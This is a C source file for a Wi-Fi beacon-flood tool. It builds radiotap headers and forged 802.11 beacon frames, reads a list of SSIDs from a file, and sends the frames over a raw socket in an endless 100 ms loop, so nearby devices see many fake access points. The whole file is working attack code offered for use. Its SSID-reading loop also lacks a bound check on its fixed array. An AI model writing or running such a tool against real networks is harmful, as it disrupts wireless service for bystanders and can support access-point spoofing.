#include "beacon-flood.h"

void build_radiotap_header(radiotap_header_t *radiotap) {
    radiotap->it_version = 0;
    radiotap->it_pad = 0;
    radiotap->it_len = sizeof(radiotap_header_t);
    radiotap->it_present = 0; // No additional fields
}

void build_beacon_frame(beacon_frame_t *beacon, const char *ssid) {
    // Frame Control: type=Management(0), subtype=Beacon(8)
    beacon->frame_control = 0x0008;
    beacon->duration = 0x013A;
    // Set MAC addresses (example values)
    memset(beacon->ra, 0xFF, 6); // Broadcast
    memset(beacon->ta, 0x00, 6); // Replace with your MAC if needed
    memset(beacon->bssid, 0x00, 6); // Replace with your BSSID if needed
    beacon->seq_ctrl = 0x0000;
    beacon->timestamp = 0x000000000000;
    beacon->beacon_interval = htons(100); // in units of 1024 microseconds
    beacon->capability = htons(0x0100); // Set capabilities as needed

    // SSID Information Element
    beacon->ssid_ie = 0; // SSID IE tag
    beacon->ssid_len = strlen(ssid);
    strncpy((char *)beacon->ssid, ssid, sizeof(beacon->ssid));
}

int send_beacon_packet(int sock, const radiotap_header_t *radiotap, const beacon_frame_t *beacon, const char *interface) {
    int bytes_sent;
    struct sockaddr_ll addr;
    char packet[sizeof(radiotap_header_t) + sizeof(beacon_frame_t)];

    // Copy Radiotap header and Beacon frame into packet
    memcpy(packet, radiotap, sizeof(radiotap_header_t));
    memcpy(packet + sizeof(radiotap_header_t), beacon, sizeof(beacon_frame_t));

    // Prepare sockaddr_ll structure
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = PF_PACKET;
    addr.sll_protocol = htons(ETH_P_ALL);
    addr.sll_ifindex = if_nametoindex(interface);
    if (addr.sll_ifindex == 0) {
        perror("if_nametoindex");
        return -1;
    }

    // Send the packet
    bytes_sent = sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&addr, sizeof(addr));
    if (bytes_sent < 0) {
        perror("sendto");
        return -1;
    }
    return bytes_sent;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <interface> <ssid-list-file>\n", argv[0]);
        return 1;
    }

    char *interface = argv[1];
    char *ssid_file = argv[2];

    // Open the SSID file
    FILE *fp = fopen(ssid_file, "r");
    if (!fp) {
        perror("fopen");
        return 1;
    }

    // Create raw socket
    int sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        perror("socket");
        fclose(fp);
        return 1;
    }

    // Build Radiotap header
    radiotap_header_t radiotap;
    build_radiotap_header(&radiotap);

    // Read SSIDs from the file into an array
    char ssids[100][33]; // Assume max 100 SSIDs, each up to 32 characters
    int ssid_count = 0;
    while (fgets(ssids[ssid_count], sizeof(ssids[ssid_count]), fp)) {
        // Remove newline character
        ssids[ssid_count][strcspn(ssids[ssid_count], "\n")] = 0;
        ssid_count++;
    }
    fclose(fp);

    if (ssid_count == 0) {
        fprintf(stderr, "No SSIDs found in the file.\n");
        close(sock);
        return 1;
    }

    printf("Sending Beacon frames. Press Ctrl+C to stop...\n");

    // Infinite loop to keep sending Beacon frames
    while (1) {
        for (int i = 0; i < ssid_count; i++) {
            // Build Beacon frame with current SSID
            beacon_frame_t beacon;
            build_beacon_frame(&beacon, ssids[i]);

            // Send the packet
            if (send_beacon_packet(sock, &radiotap, &beacon, interface) < 0) {
                perror("send_beacon_packet");
                close(sock);
                return 1;
            }

            // Sleep for the Beacon interval (e.g., 100ms)
            struct timespec ts;
            ts.tv_sec = 0;
            ts.tv_nsec = 100000000; // 100 milliseconds
            nanosleep(&ts, NULL);
        }
    }

    // Clean up (this will never be reached due to the infinite loop)
    close(sock);
    return 0;
}